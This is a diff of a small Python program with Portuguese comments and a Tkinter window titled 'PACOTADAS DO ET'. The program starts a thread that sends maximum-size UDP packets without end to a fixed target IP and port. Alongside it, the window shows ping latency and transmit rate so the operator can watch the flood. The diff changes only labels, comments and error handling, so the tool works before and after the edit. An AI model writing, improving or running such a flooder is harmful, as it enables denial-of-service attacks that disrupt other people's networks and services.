@@ -4,30 +4,28 @@ import psutil
 import time
 import subprocess
 import socket
+import sys
 
-# === CONFIG ===
-TARGET_IP = "192.168.1.5"      # IP do alvo
-TARGET_PORT = 8080           # Porta do alvo
-BUFFER_SIZE = 65507        # Tamanho do pacote UDP (máximo recomendado)
+# CONFIGURAÇÕES
+TARGET_IP = "192.168.1.5"      # IP alvo para flood e ping
+TARGET_PORT = 8080           # Porta alvo UDP
+BUFFER_SIZE = 65507        # Tamanho máximo UDP seguro (sem fragmentação)
 
-# === Função para flood UDP ===
 def flood_packets():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     payload = b'A' * BUFFER_SIZE
     while True:
         try:
             s.sendto(payload, (TARGET_IP, TARGET_PORT))
-        except:
-            pass
+        except Exception as e:
+            print(f"Erro no flood: {e}", file=sys.stderr)
 
-# === Função para medir TX ===
 def get_tx_mbps():
     old_sent = psutil.net_io_counters().bytes_sent
     time.sleep(1)
     new_sent = psutil.net_io_counters().bytes_sent
     return (new_sent - old_sent) / 1_000_000
 
-# === Função para ping ===
 def get_ping(ip):
     try:
         result = subprocess.run(["ping", "-n", "1", ip], capture_output=True, text=True)
@@ -38,7 +36,6 @@ def get_ping(ip):
         return "Erro"
     return "Timeout"
 
-# === Atualiza texto da GUI ===
 def update_info():
     while True:
         tx = get_tx_mbps()
@@ -46,22 +43,21 @@ def update_info():
         status_var.set(f"TX: {tx:.2f} MB/s    Ping: {ping}")
         time.sleep(1)
 
-# === GUI ===
+# CONFIGURAÇÃO DA GUI
 root = tk.Tk()
-root.title("PACOTADOR")
+root.title("PACOTADAS DO ET")
 root.geometry("400x200")
 root.resizable(False, False)
+root.configure(bg="black")
 
-label = tk.Label(root, text="PACOTANTE", font=("Helvetica", 24, "bold"), fg="lime", bg="black")
+label = tk.Label(root, text="PACOTADAS DO ET", font=("Helvetica", 24, "bold"), fg="lime", bg="black")
 label.pack(pady=20, expand=True, fill="both")
 
 status_var = tk.StringVar()
 status_label = tk.Label(root, textvariable=status_var, font=("Courier", 14), bg="black", fg="white")
 status_label.pack(side="bottom", pady=10)
 
-root.configure(bg="black")
-
-# === Threads ===
+# INICIA THREADS
 threading.Thread(target=update_info, daemon=True).start()
 threading.Thread(target=flood_packets, daemon=True).start()
 
